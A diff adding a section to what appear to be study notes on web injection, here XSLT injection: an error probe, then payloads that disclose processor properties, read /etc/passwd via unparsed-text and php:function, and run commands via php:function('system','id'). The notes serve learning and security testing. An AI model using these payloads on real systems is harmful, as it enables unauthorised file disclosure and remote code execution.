@@ -149,3 +149,43 @@ An SSI directive has the following syntax:
 <!--#include virtual="index.html" -->
 ```
 
+# Exploiting XSLT Injection
+
+Suppose the web application stores the module information in an XML document and displays the data using XSLT processing. In that case, it might be vulnerable to XSLT injection if our name is inserted without sanitization before XSLT processing. To confirm this, let us try injecting a broken XML tag to provoke an error in the web application. We can achieve this by providing the username `<`:
+
+![](Pasted%20image%2020260115114204.png)
+
+## Information Disclosure
+
+```xml
+Version: <xsl:value-of select="system-property('xsl:version')" />
+<br/>
+Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
+<br/>
+Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
+<br/>
+Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
+<br/>
+Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
+```
+
+## LFI
+
+```xml
+<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
+```
+
+This was only introduced in XSLT version 2.0.
+
+If the XSLT library is configured to support PHP functions, we can call the PHP function `file_get_contents` using the following XSLT element:
+
+```xml
+<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
+```
+
+## RCE
+
+```xml
+<xsl:value-of select="php:function('system','id')" />
+```
+
